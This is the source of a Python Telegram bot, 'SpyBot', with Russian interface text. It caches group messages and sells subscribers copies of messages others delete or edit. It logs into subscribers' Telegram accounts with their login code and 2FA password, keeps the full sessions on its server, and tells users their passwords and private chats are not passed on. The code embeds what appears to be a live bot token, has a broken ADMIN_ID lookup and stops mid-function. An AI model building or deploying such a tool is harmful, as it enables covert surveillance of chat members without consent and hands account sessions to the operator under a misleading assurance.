"""
SpyBot — всё в одном файле.
Установка: pip install aiogram aiosqlite telethon cryptography python-dotenv
Запуск:    python bot.py

Переменные окружения (или задай прямо здесь):
  BOT_TOKEN              — токен от @BotFather
  ADMIN_ID               — твой Telegram ID (узнай у @userinfobot)
  API_ID                 — из my.telegram.org
  API_HASH               — из my.telegram.org
  SESSION_ENCRYPTION_KEY — сгенерировать:
      python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
"""

# ══════════════════════════════════════════════════════════
#  НАСТРОЙКИ — заполни здесь или через переменные окружения
# ══════════════════════════════════════════════════════════
import os

BOT_TOKEN   = os.getenv("BOT_TOKEN",   "8989924852:AAFPev4Tva0mBjXMqIDlxLzmdrEEZCfCSR4")
ADMIN_ID    = int(os.getenv("8769232009", "0"))   # твой Telegram ID
API_ID      = int(os.getenv("API_ID",   "0"))   # my.telegram.org
API_HASH    = os.getenv("API_HASH",     "")     # my.telegram.org
SESSION_KEY = os.getenv("SESSION_ENCRYPTION_KEY", "")  # Fernet key

STARS_PRICE = 69    # цена подписки в Telegram Stars
TRIAL_DAYS  = 10    # дней пробного периода
SUB_DAYS    = 30    # дней платной подписки
DB_PATH     = os.getenv("DB_PATH", "spybot.db")

# ══════════════════════════════════════════════════════════
#  ИМПОРТЫ
# ══════════════════════════════════════════════════════════
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Optional

import aiosqlite
from cryptography.fernet import Fernet, InvalidToken

from aiogram import Bot, Dispatcher, Router, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, ChatMemberUpdated, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    LabeledPrice, PreCheckoutQuery,
)
from aiogram.filters import CommandStart, Command, ChatMemberUpdatedFilter, KICKED, MEMBER

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, PhoneNumberInvalidError, FloodWaitError,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════════
#  ШИФРОВАНИЕ СЕССИЙ
# ══════════════════════════════════════════════════════════
if not SESSION_KEY:
    log.warning("SESSION_ENCRYPTION_KEY не задан — генерирую временный. "
                "Задай постоянный ключ, иначе сессии сбросятся при перезапуске!\n"
                "Сгенерировать: python -c \"from cryptography.fernet import Fernet; "
                "print(Fernet.generate_key().decode())\"")
    SESSION_KEY = Fernet.generate_key().decode()

_fernet = Fernet(SESSION_KEY.encode())

def enc(s: str) -> str:
    return _fernet.encrypt(s.encode()).decode()

def dec(s: str) -> Optional[str]:
    try:
        return _fernet.decrypt(s.encode()).decode()
    except InvalidToken:
        return None

# ══════════════════════════════════════════════════════════
#  БАЗА ДАННЫХ
# ══════════════════════════════════════════════════════════
_db: Optional[aiosqlite.Connection] = None

async def db_init():
    global _db
    _db = await aiosqlite.connect(DB_PATH)
    _db.row_factory = aiosqlite.Row
    await _db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id     INTEGER PRIMARY KEY,
            name        TEXT,
            created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            trial_start TIMESTAMP,
            trial_used  INTEGER DEFAULT 0,
            sub_until   TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS chats (
            chat_id     INTEGER PRIMARY KEY,
            owner_id    INTEGER NOT NULL,
            title       TEXT,
            added_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS message_cache (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id     INTEGER NOT NULL,
            message_id  INTEGER NOT NULL,
            chat_title  TEXT,
            sender_id   INTEGER,
            sender_name TEXT,
            text        TEXT,
            media_type  TEXT,
            file_id     TEXT,
            date        TIMESTAMP,
            cached_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            UNIQUE(chat_id, message_id)
        );
        CREATE TABLE IF NOT EXISTS user_sessions (
            user_id      INTEGER PRIMARY KEY,
            session_enc  TEXT,
            phone        TEXT,
            connected_at TIMESTAMP,
            active       INTEGER DEFAULT 1
        );
    """)
    await _db.commit()
    log.info(f"Database ready: {DB_PATH}")

def _parse_dt(val) -> Optional[datetime]:
    if not val:
        return None
    if isinstance(val, datetime):
        return val
    try:
        return datetime.fromisoformat(val)
    except Exception:
        return None

# ── users ──────────────────────────────────────────────────────────────────

async def db_get_or_create_user(user_id: int, name: str) -> dict:
    async with _db.execute("SELECT * FROM users WHERE user_id=?", (user_id,)) as c:
        row = await c.fetchone()
    if row:
        return dict(row)
    await _db.execute("INSERT OR IGNORE INTO users(user_id,name) VALUES(?,?)", (user_id, name))
    await _db.commit()
    return {"user_id": user_id, "name": name, "trial_used": 0}

async def db_get_user(user_id: int) -> Optional[dict]:
    async with _db.execute("SELECT * FROM users WHERE user_id=?", (user_id,)) as c:
        row = await c.fetchone()
    if not row:
        return None
    d = dict(row)
    d["trial_start"] = _parse_dt(d.get("trial_start"))
    d["sub_until"]   = _parse_dt(d.get("sub_until"))
    return d

async def db_activate_trial(user_id: int):
    await _db.execute("UPDATE users SET trial_start=?,trial_used=1 WHERE user_id=?",
                      (datetime.utcnow(), user_id))
    await _db.commit()

async def db_set_sub(user_id: int, until: datetime):
    await _db.execute("UPDATE users SET sub_until=? WHERE user_id=?", (until, user_id))
    await _db.commit()

async def db_all_user_ids() -> list[int]:
    async with _db.execute("SELECT user_id FROM users") as c:
        return [r[0] for r in await c.fetchall()]

# ── chats ──────────────────────────────────────────────────────────────────

async def db_add_chat(owner_id: int, chat_id: int, title: str):
    await _db.execute(
        "INSERT OR REPLACE INTO chats(chat_id,owner_id,title) VALUES(?,?,?)",
        (chat_id, owner_id, title))
    await _db.commit()

async def db_remove_chat(chat_id: int):
    await _db.execute("DELETE FROM chats WHERE chat_id=?", (chat_id,))
    await _db.commit()

async def db_user_chats(user_id: int) -> list[dict]:
    async with _db.execute("SELECT * FROM chats WHERE owner_id=?", (user_id,)) as c:
        return [dict(r) for r in await c.fetchall()]

async def db_chat_owners(chat_id: int) -> list[int]:
    async with _db.execute("SELECT owner_id FROM chats WHERE chat_id=?", (chat_id,)) as c:
        return [r[0] for r in await c.fetchall()]

# ── message cache ──────────────────────────────────────────────────────────

async def db_cache_msg(message: Message):
    media_type = file_id = None
    if message.photo:       media_type, file_id = "photo",      message.photo[-1].file_id
    elif message.video:     media_type, file_id = "video",      message.video.file_id
    elif message.audio:     media_type, file_id = "audio",      message.audio.file_id
    elif message.document:  media_type, file_id = "document",   message.document.file_id
    elif message.sticker:   media_type, file_id = "sticker",    message.sticker.file_id
    elif message.voice:     media_type, file_id = "voice",      message.voice.file_id
    elif message.video_note:media_type, file_id = "video_note", message.video_note.file_id

    try:
        await _db.execute(
            """INSERT OR REPLACE INTO message_cache
               (chat_id,message_id,chat_title,sender_id,sender_name,text,media_type,file_id,date)
               VALUES(?,?,?,?,?,?,?,?,?)""",
            (message.chat.id, message.message_id,
             message.chat.title or str(message.chat.id),
             message.from_user.id if message.from_user else None,
             message.from_user.full_name if message.from_user else "Аноним",
             message.text or message.caption,
             media_type, file_id, message.date))
        await _db.commit()
    except Exception as e:
        log.warning(f"cache_msg error: {e}")
    # чистка
    cutoff = datetime.utcnow() - timedelta(hours=48)
    await _db.execute("DELETE FROM message_cache WHERE chat_id=? AND cached_at<?",
                      (message.chat.id, cutoff))
    await _db.execute(
        """DELETE FROM message_cache WHERE chat_id=? AND id NOT IN (
           SELECT id FROM message_cache WHERE chat_id=? ORDER BY cached_at DESC LIMIT 1000)""",
        (message.chat.id, message.chat.id))
    await _db.commit()

async def db_get_cached(chat_id: int, msg_id: int) -> Optional[dict]:
    async with _db.execute(
        "SELECT * FROM message_cache WHERE chat_id=? AND message_id=?", (chat_id, msg_id)
    ) as c:
        row = await c.fetchone()
    if not row:
        return None
    d = dict(row)
    d["date"] = _parse_dt(d.get("date")) or datetime.utcnow()
    return d

async def db_del_cached(chat_id: int, msg_id: int):
    await _db.execute(
        "DELETE FROM message_cache WHERE chat_id=? AND message_id=?", (chat_id, msg_id))
    await _db.commit()

# ── sessions ───────────────────────────────────────────────────────────────

async def db_save_session(user_id: int, session_enc: str, phone: str):
    await _db.execute(
        """INSERT INTO user_sessions(user_id,session_enc,phone,connected_at,active)
           VALUES(?,?,?,?,1)
           ON CONFLICT(user_id) DO UPDATE SET
               session_enc=excluded.session_enc, phone=excluded.phone,
               connected_at=excluded.connected_at, active=1""",
        (user_id, session_enc, phone, datetime.utcnow()))
    await _db.commit()

async def db_get_session(user_id: int) -> Optional[dict]:
    async with _db.execute(
        "SELECT * FROM user_sessions WHERE user_id=? AND active=1", (user_id,)
    ) as c:
        row = await c.fetchone()
    return dict(row) if row else None

async def db_all_sessions() -> list[dict]:
    async with _db.execute("SELECT * FROM user_sessions WHERE active=1") as c:
        return [dict(r) for r in await c.fetchall()]

async def db_deactivate_session(user_id: int):
    await _db.execute("UPDATE user_sessions SET active=0 WHERE user_id=?", (user_id,))
    await _db.commit()

# ── stats ──────────────────────────────────────────────────────────────────

async def db_stats() -> dict:
    now = datetime.utcnow()
    trial_cutoff = now - timedelta(days=TRIAL_DAYS)
    async def one(q, *a):
        async with _db.execute(q, a) as c:
            return (await c.fetchone())[0]
    return {
        "users":       await one("SELECT COUNT(*) FROM users"),
        "chats":       await one("SELECT COUNT(*) FROM chats"),
        "cached":      await one("SELECT COUNT(*) FROM message_cache"),
        "active_subs": await one("SELECT COUNT(*) FROM users WHERE sub_until>?", now),
        "trials":      await one(
            "SELECT COUNT(*) FROM users WHERE trial_start>? AND sub_until IS NULL", trial_cutoff),
    }

# ══════════════════════════════════════════════════════════
#  ПОДПИСКА
# ══════════════════════════════════════════════════════════

async def is_subscribed(user_id: int) -> bool:
    user = await db_get_user(user_id)
    if not user:
        return False
    if user.get("sub_until"):
        return datetime.utcnow() < user["sub_until"]
    if user.get("trial_start"):
        return datetime.utcnow() < user["trial_start"] + timedelta(days=TRIAL_DAYS)
    return False

async def active_owners(chat_id: int) -> list[int]:
    return [uid for uid in await db_chat_owners(chat_id) if await is_subscribed(uid)]

# ══════════════════════════════════════════════════════════
#  КЛАВИАТУРЫ
# ══════════════════════════════════════════════════════════

def kb_main() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Мои чаты",            callback_data="my_chats")],
        [InlineKeyboardButton(text="👤 Профиль / Подписка",  callback_data="profile")],
        [InlineKeyboardButton(text="📱 Мой аккаунт",         callback_data="my_account")],
        [InlineKeyboardButton(text="❓ Как это работает",     callback_data="howto")],
    ])

def kb_sub() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⭐ Купить — {STARS_PRICE} Stars", callback_data="buy_sub")],
        [InlineKeyboardButton(text="🎁 Пробный период (10 дней)",      callback_data="trial")],
    ])

def kb_back() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_main")]
    ])

def kb_cancel() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_connect")]
    ])

def kb_account(connected: bool) -> InlineKeyboardMarkup:
    btn = (
        InlineKeyboardButton(text="🔴 Отключить аккаунт",         callback_data="disconnect_account")
        if connected else
        InlineKeyboardButton(text="🔗 Подключить Telegram-аккаунт", callback_data="connect_account")
    )
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_main")],
    ])

# ══════════════════════════════════════════════════════════
#  УВЕДОМЛЕНИЯ
# ══════════════════════════════════════════════════════════

async def notify_deleted(bot: Bot, user_id: int, cached: dict):
    date_str = cached["date"].strftime("%d.%m.%Y %H:%M") if cached.get("date") else "?"
    header = (
        f"🗑 <b>Удалённое сообщение</b>\n"
        f"💬 Чат: <b>{cached.get('chat_title','?')}</b>\n"
        f"👤 Отправитель: <b>{cached.get('sender_name','Аноним')}</b>\n"
        f"🕐 Время: {date_str}\n"
    )
    try:
        if cached.get("text"):
            await bot.send_message(user_id, header + f"\n📝 Текст:\n{cached['text']}")
        elif cached.get("file_id"):
            await bot.send_message(user_id, header + f"\n📎 Тип: {cached.get('media_type')}")
            await resend_media(bot, user_id, cached.get("media_type"), cached["file_id"])
        else:
            await bot.send_message(user_id, header + "\n[медиа без текста]")
    except Exception as e:
        log.warning(f"notify_deleted failed for {user_id}: {e}")

async def notify_edited(bot: Bot, user_id: int, chat_title: str,
                        sender: str, old_text: str, new_text: str):
    try:
        await bot.send_message(user_id,
            f"✏️ <b>Изменённое сообщение</b>\n"
            f"💬 Чат: <b>{chat_title}</b>\n"
            f"👤 Автор: <b>{sender}</b>\n"
            f"🕐 Время: {datetime.utcnow().strftime('%d.%m.%Y %H:%M')}\n\n"
            f"📝 <b>Было:</b>\n{old_text}\n\n"
            f"📝 <b>Стало:</b>\n{new_text}"
        )
    except Exception as e:
        log.warning(f"notify_edited failed for {user_id}: {e}")

async def resend_media(bot: Bot, user_id: int, media_type: str, file_id: str):
    try:
        m = {"photo": bot.send_photo, "video": bot.send_video, "audio": bot.send_audio,
             "document": bot.send_document, "sticker": bot.send_sticker,
             "voice": bot.send_voice, "video_note": bot.send_video_note}
        if media_type in m:
            await m[media_type](user_id, file_id)
    except Exception as e:
        log.warning(f"resend_media failed: {e}")

# ══════════════════════════════════════════════════════════
#  МЕНЕДЖЕР ПОЛЬЗОВАТЕЛЬСКИХ СЕССИЙ (Telethon)
# ══════════════════════════════════════════════════════════

class _LoginSession:
    def __init__(self, client: TelegramClient, phone: str):
        self.client = client
        self.phone  = phone
        self.phone_code_hash: Optional[str] = None

class SessionManager:
    def __init__(self):
        self._clients: dict[int, TelegramClient] = {}
        self._pending: dict[int, _LoginSession]  = {}
        self._bot: Optional[Bot] = None

    def set_bot(self, bot: Bot):
        self._bot = bot

    def is_connected(self, user_id: int) -> bool:
        return user_id in self._clients

    # ── login ──────────────────────────────────────────────────────────────

    async def start_login(self, user_id: int, phone: str) -> tuple[bool, str]:
        if not API_ID or not API_HASH:
            return False, "⚠️ Сервис не настроен (нет API_ID/API_HASH). Обратись к администратору."
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            sent = await client.send_code_request(phone)
        except PhoneNumberInvalidError:
            await client.disconnect()
            return False, "❌ Неверный формат номера. Пример: +79991234567"
        except FloodWaitError as e:
            await client.disconnect()
            return False, f"⏳ Слишком много попыток. Подожди {e.seconds} сек."
        except Exception as e:
            await client.disconnect()
            return False, f"❌ Не удалось отправить код: {e}"
        ls = _LoginSession(client, phone)
        ls.phone_code_hash = sent.phone_code_hash
        self._pending[user_id] = ls
        return True, "📲 Код отправлен!"

    async def submit_code(self, user_id: int, code: str) -> tuple[bool, str, bool]:
        """(успех, сообщение, нужен_2FA)"""
        ls = self._pending.get(user_id)
        if not ls:
            return False, "❌ Сессия не найдена, начни заново.", False
        try:
            await ls.client.sign_in(phone=ls.phone, code=code,
                                    phone_code_hash=ls.phone_code_hash)
        except SessionPasswordNeededError:
            return False, "🔐 Включена 2FA. Введи пароль:", True
        except (PhoneCodeInvalidError, PhoneCodeExpiredError):
            return False, "❌ Неверный или устаревший код.", False
        except Exception as e:
            return False, f"❌ Ошибка: {e}", False
        ok, msg = await self._finalize(user_id, ls)
        return ok, msg, False

    async def submit_2fa(self, user_id: int, password: str) -> tuple[bool, str]:
        ls = self._pending.get(user_id)
        if not ls:
            return False, "❌ Сессия не найдена, начни заново."
        try:
            await ls.client.sign_in(password=password)
        except Exception as e:
            return False, f"❌ Неверный пароль 2FA: {e}"
        return await self._finalize(user_id, ls)

    async def _finalize(self, user_id: int, ls: _LoginSession) -> tuple[bool, str]:
        me = await ls.client.get_me()
        encrypted = enc(ls.client.session.save())
        await db_save_session(user_id, encrypted, ls.phone)
        del self._pending[user_id]
        self._clients[user_id] = ls.client
        self._register(user_id, ls.client)
        log.info(f"User {user_id} connected account @{me.username or me.id}")
        return True, f"✅ Аккаунт @{me.username or me.first_name} подключён!\nТеперь ловлю удалённые сообщения в твоих чатах."

    def cancel_login(self, user_id: int):
        ls = self._pending.pop(user_id, None)
        if ls:
            asyncio.create_task(ls.client.disconnect())

    # ── lifecycle ──────────────────────────────────────────────────────────

    async def restore_all(self):
        if not API_ID or not API_HASH:
            return
        rows = await db_all_sessions()
        for row in rows:
            uid = row["user_id"]
            decrypted = dec(row["session_enc"])
            if not decrypted:
                log.warning(f"Cannot decrypt session for user {uid}")
                continue
            try:
                client = TelegramClient(StringSession(decrypted), API_ID, API_HASH)
                await client.connect()
                if not await client.is_user_authorized():
                    log.warning(f"Session for user {uid} expired")
                    await db_deactivate_session(uid)
                    await client.disconnect()
                    continue
                self._clients[uid] = client
                self._register(uid, client)
                log.info(f"Restored session for user {uid}")
            except Exception as e:
                log.warning(f"Failed to restore session for {uid}: {e}")
        log.info(f"Restored {len(self._clients)} session(s)")

    async def disconnect_user(self, user_id: int):
        client = self._clients.pop(user_id, None)
        if client:
            await client.disconnect()
        await db_deactivate_session(user_id)

    async def shutdown(self):
        for c in self._clients.values():
            try:
                await c.disconnect()
            except Exception:
                pass

    async def run_forever(self):
        """Держит клиенты живыми — переподключает раз в час."""
        while True:
            await asyncio.sleep(3600)
            for uid, client in list(self._clients.items()):
                if not client.is_connected():
                    try:
                        await client.connect()
                        log.info(f"Reconnected session for user {uid}")
                    except Exception as e:
                        log.warning(f"Reconnect failed for {uid}: {e}")

    # ── event handler ──────────────────────────────────────────────────────

    def _register(self, user_id: int, client: TelegramClient):
        bot = self._bot

        @client.on(events.MessageDeleted())
        async def on_deleted(event: events.MessageDeleted.Event):
            chat_id = event.chat_id
            if chat_id is None:
                return
            # Telethon и Bot API могут по-разному кодировать chat_id
            candidates = {chat_id, -chat_id, -1000000000000 - chat_id} if chat_id > 0 else {chat_id}
            for cid in candidates:
                owners = await db_chat_owners(cid)
                if user_id not in owners:
                    continue
                if not await is_subscribed(user_id):
                    continue
                for msg_id in event.deleted_ids:
                    cached = await db_get_cached(cid, msg_id)
                    if not cached:
                        continue
                    await notify_deleted(bot, user_id, cached)
                    await db_del_cached(cid, msg_id)

sm = SessionManager()

# ══════════════════════════════════════════════════════════
#  FSM STATES
# ══════════════════════════════════════════════════════════

class ConnectAccount(StatesGroup):
    waiting_phone = State()
    waiting_code  = State()
    waiting_2fa   = State()

# ══════════════════════════════════════════════════════════
#  РОУТЕР / ХЕНДЛЕРЫ
# ══════════════════════════════════════════════════════════

router = Router(name="spybot")

# ── /start ─────────────────────────────────────────────────────────────────

@router.message(CommandStart())
async def cmd_start(message: Message):
    await db_get_or_create_user(message.from_user.id, message.from_user.full_name)
    active = await is_subscribed(message.from_user.id)
    if active:
        await message.answer(
            f"👋 Привет, <b>{message.from_user.first_name}</b>!\n\n"
            "🤖 <b>SpyBot</b> активен. Что умеет:\n"
            "🗑 Ловит <b>удалённые</b> сообщения\n"
            "✏️ Ловит <b>изменённые</b> сообщения\n"
            "🔥 Перехватывает <b>одноразовые</b> медиа\n\n"
            "Все перехваченные сообщения приходят тебе в ЛС.",
            reply_markup=kb_main()
        )
    else:
        await message.answer(
            f"👋 Привет, <b>{message.from_user.first_name}</b>!\n\n"
            "🤖 <b>SpyBot</b> — детектив в Telegram.\n\n"
            "🗑 Ловит удалённые сообщения\n"
            "✏️ Ловит изменённые (до/после)\n"
            "🔥 Перехватывает одноразовые фото/видео\n\n"
            f"💰 <b>{STARS_PRICE} ⭐ Stars</b> / месяц\n"
            f"🎁 Пробный период: <b>{TRIAL_DAYS} дней бесплатно</b>",
            reply_markup=kb_sub()
        )

# ── профиль ────────────────────────────────────────────────────────────────

@router.callback_query(F.data == "profile")
async def cb_profile(call: CallbackQuery):
    user = await db_get_user(call.from_user.id)
    if not user:
        await call.answer("Сначала используй /start", show_alert=True)
        return
    active = await is_subscribed(call.from_user.id)
    chats  = await db_user_chats(call.from_user.id)
    if active:
        if user.get("sub_until"):
            status = f"✅ Подписка до <b>{user['sub_until'].strftime('%d.%m.%Y')}</b>"
        else:
            end  = user["trial_start"] + timedelta(days=TRIAL_DAYS)
            left = max((end - datetime.utcnow()).days, 0)
            status = f"🎁 Пробный до <b>{end.strftime('%d.%m.%Y')}</b> (осталось {left} дн.)"
    else:
        status = "❌ Подписка не активна"
    acc = "🟢 Подключён" if sm.is_connected(call.from_user.id) else "🔴 Не подключён"
    await call.message.edit_text(
        f"👤 <b>Профиль</b>\n\n"
        f"ID: <code>{call.from_user.id}</code>\n"
        f"Имя: {call.from_user.full_name}\n"
        f"Статус: {status}\n"
        f"Чатов: <b>{len(chats)}</b>\n"
        f"Аккаунт (перехват удалённых): {acc}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"⭐ Продлить — {STARS_PRICE} Stars", callback_data="buy_sub")],
            [InlineKeyboardButton(text="📱 Мой аккаунт", callback_data="my_account")],
            [InlineKeyboardButton(text="◀️ Назад",        callback_data="back_main")],
        ])
    )
    await call.answer()

# ── мои чаты ───────────────────────────────────────────────────────────────

@router.callback_query(F.data == "my_chats")
async def cb_my_chats(call: CallbackQuery):
    chats = await db_user_chats(call.from_user.id)
    if not chats:
        text = "📋 <b>Мои чаты</b>\n\nПока нет отслеживаемых чатов.\nДобавь бота в чат как администратора!"
    else:
        lines = "\n".join(f"• {c['title']} (<code>{c['chat_id']}</code>)" for c in chats)
        text = f"📋 <b>Мои чаты</b> ({len(chats)}):\n\n{lines}"
    await call.message.edit_text(text, reply_markup=kb_back())
    await call.answer()

# ── как это работает ───────────────────────────────────────────────────────

@router.callback_query(F.data == "howto")
async def cb_howto(call: CallbackQuery):
    await call.message.edit_text(
        "❓ <b>Как использовать SpyBot</b>\n\n"
        "<b>Шаг 1.</b> Активируй подписку или пробный период\n\n"
        "<b>Шаг 2.</b> Подключи свой Telegram-аккаунт\n"
        "📱 Мой аккаунт → Подключить → введи номер и код\n"
        "Это нужно чтобы ловить <b>удалённые</b> сообщения\n\n"
        "<b>Шаг 3.</b> Добавь бота в чат как администратора\n"
        "Настройки группы → Администраторы → @SpyBot\n\n"
        "<b>Шаг 4.</b> Сам состой в этом чате под своим аккаунтом\n\n"
        "✅ Всё перехваченное придёт тебе в ЛС.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📱 Подключить аккаунт", callback_data="my_account")],
            [InlineKeyboardButton(text="◀️ Назад",               callback_data="back_main")],
        ])
    )
    await call.answer()

@router.callback_query(F.data == "back_main")
async def cb_back(call: CallbackQuery):
    await call.message.edit_text("🏠 <b>Главное меню</b>", reply_markup=kb_main())
    await call.answer()

# ── триал ──────────────────────────────────────────────────────────────────

@router.callback_query(F.data == "trial")
async def cb_trial(call: CallbackQuery):
    user = await db_get_user(call.from_user.id)
    if not user:
        await db_get_or_create_user(call.from_user.id, call.from_user.full_name)
        user = await db_get_user(call.from_user.id)
    if user.get("trial_used"):
        await call.answer("❌ Пробный период уже использован!", show_alert=True)
        return
    await db_activate_trial(call.from_user.id)
    end = (datetime.utcnow() + timedelta(days=TRIAL_DAYS)).strftime("%d.%m.%Y")
    await call.message.edit_text(
        f"🎉 <b>Пробный период активирован!</b>\n\nДо: <b>{end}</b>\n\n"
        "Теперь подключи свой аккаунт для перехвата удалённых:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📱 Подключить аккаунт", callback_data="my_account")],
            [InlineKeyboardButton(text="🏠 Главное меню",        callback_data="back_main")],
        ])
    )
    await call.answer("✅ Активировано!")

# ── оплата Stars ───────────────────────────────────────────────────────────

@router.callback_query(F.data == "buy_sub")
async def cb_buy(call: CallbackQuery, bot: Bot):
    await bot.send_invoice(
        chat_id=call.from_user.id,
        title=f"⭐ Подписка SpyBot — {SUB_DAYS} дней",
        description=f"Перехват удалённых, изменённых и одноразовых сообщений на {SUB_DAYS} дней.",
        payload="sub_period",
        currency="XTR",
        prices=[LabeledPrice(label=f"Подписка {SUB_DAYS} дней", amount=STARS_PRICE)],
        provider_token="",
    )
    await call.answer()

@router.pre_checkout_query()
async def pre_checkout(pcq: PreCheckoutQuery):
    await pcq.answer(ok=True)

@router.message(F.successful_payment)
async def payment_done(message: Message):
    until = datetime.utcnow() + timedelta(days=SUB_DAYS)
    await db_set_sub(message.from_user.id, until)
    connected = sm.is_connected(message.from_user.id)
    extra = "\n\n📱 Подключи аккаунт для перехвата удалённых!" if not connected else ""
    await message.answer(
        f"✅ <b>Подписка активирована!</b>\nДо: <b>{until.strftime('%d.%m.%Y')}</b>{extra}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📱 Подключить аккаунт", callback_data="my_account")],
            [InlineKeyboardButton(text="🏠 Главное меню",        callback_data="back_main")],
        ]) if not connected else kb_main()
    )
    log.info(f"Payment OK: user={message.from_user.id} until={until}")

# ── подключение аккаунта (FSM) ─────────────────────────────────────────────

@router.callback_query(F.data == "my_account")
async def cb_my_account(call: CallbackQuery):
    connected = sm.is_connected(call.from_user.id)
    sess  = await db_get_session(call.from_user.id)
    phone = sess["phone"] if sess else None
    await call.message.edit_text(
        "📱 <b>Мой Telegram-аккаунт</b>\n\n"
        f"Статус: {'🟢 Подключён' if connected else '🔴 Не подключён'}\n"
        + (f"Номер: <code>{phone}</code>\n" if phone else "")
        + "\nПодключи аккаунт — и бот начнёт ловить <b>удалённые сообщения</b> в твоих чатах.\n\n"
        "⚠️ Бот получает доступ только к списку удалённых сообщений в чатах, где ты состоишь. "
        "Пароли и личная переписка не передаются.",
        reply_markup=kb_account(connected)
    )
    await call.answer()

@router.callback_query(F.data == "connect_account")
async def cb_connect(call: CallbackQuery, state: FSMContext):
    if not await is_subscribed(call.from_user.id):
        await call.answer("❌ Сначала активируй подписку!", show_alert=True)
        return
    await call.message.edit_text(
        "📱 <b>Подключение аккаунта</b>\n\n"
        "Введи номер телефона в формате:\n<code>+79991234567</code>",
        reply_markup=kb_cancel()
    )
    await state.set_state(ConnectAccount.waiting_phone)
    await call.answer()

@router.message(ConnectAccount.waiting_phone, F.text)
async def fsm_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith("+") or len(phone) < 8:
        await message.answer("❌ Неверный формат. Пример: <code>+79991234567</code>", reply_markup=kb_cancel())
        return
    await message.answer("⏳ Отправляю код...")
    ok, msg = await sm.start_login(message.from_user.id, phone)
    if not ok:
        await message.answer(msg, reply_markup=kb_cancel())
        return
    await state.update_data(phone=phone)
    await state.set_state(ConnectAccount.waiting_code)
    await message.answer(
        f"✅ {msg}\n\nВведи код из Telegram (только цифры):",
        reply_markup=kb_cancel()
    )

@router.message(ConnectAccount.waiting_code, F.text)
async def fsm_code(message: Message, state: FSMContext):
    code = message.text.strip().replace(" ", "").replace("-", "")
    await message.answer("⏳ Проверяю...")
    ok, msg, need_2fa = await sm.submit_code(message.from_user.id, code)
    if need_2fa:
        await state.set_state(ConnectAccount.waiting_2fa)
        await message.answer(msg, reply_markup=kb_cancel())
        return
    await state.clear()
    await message.answer(msg, reply_markup=kb_main() if ok else kb_cancel())

@router.message(ConnectAccount.waiting_2fa, F.text)
async def fsm_2fa(message: Message, state: FSMContext):
    await message.answer("⏳ Проверяю пароль...")
    ok, msg = await sm.submit_2fa(message.from_user.id, message.text.strip())
    await state.clear()
    await message.answer(msg, reply_markup=kb_main() if ok else kb_cancel())

@router.callback_query(F.data == "cancel_connect")
async def cb_cancel(call: CallbackQuery, state: FSMContext):
    sm.cancel_login(call.from_user.id)
    await state.clear()
    await call.message.edit_text("❌ Подключение отменено.", reply_markup=kb_main())
    await call.answer()

@router.callback_query(F.data == "disconnect_account")
async def cb_disconnect(call: CallbackQuery):
    await sm.disconnect_user(call.from_user.id)
    await call.message.edit_text(
        "🔴 <b>Аккаунт отключён.</b>\n\nПеrehват удалённых сообщений остановлен.",
        reply_markup=kb_account(False)
    )
    await call.answer("✅ Отключено")

# ── бот добавлен/удалён из чата ────────────────────────────────────────────

@router.my_chat_member(ChatMemberUpdatedFilter(member_status_changed=MEMBER))
async def bot_added(event: ChatMemberUpdated, bot: Bot):
    me = await bot.get_me()
    if event.new_chat_member.user.id != me.id:
        return
    adder = event.from_user.id
    chat  = event.chat
    if not await is_subscribed(adder):
        await bot.send_message(adder,
            f"⚠️ Ты добавил бота в <b>{chat.title}</b>, но подписка не активна.",
            reply_markup=kb_sub())
        return
    await db_add_chat(adder, chat.id, chat.title or str(chat.id))
    connected = sm.is_connected(adder)
    extra = "✅ Аккаунт подключён — буду ловить и удалённые!" if connected \
            else "⚠️ Подключи аккаунт (📱 Мой аккаунт) для перехвата удалённых."
    await bot.send_message(adder,
        f"✅ Бот добавлен в <b>{chat.title}</b>!\n{extra}",
        reply_markup=kb_main())
    log.info(f"Bot added to chat {chat.id} by user {adder}")

@router.my_chat_member(ChatMemberUpdatedFilter(member_status_changed=KICKED))
async def bot_removed(event: ChatMemberUpdated):
    await db_remove_chat(event.chat.id)

# ── кеш входящих сообщений ─────────────────────────────────────────────────

@router.message(F.chat.type.in_({"group", "supergroup", "channel"}))
async def cache_message(message: Message):
    owners = await active_owners(message.chat.id)
    if not owners:
        return
    await db_cache_msg(message)
    # одноразовые spoiler-медиа — пересылаем сразу
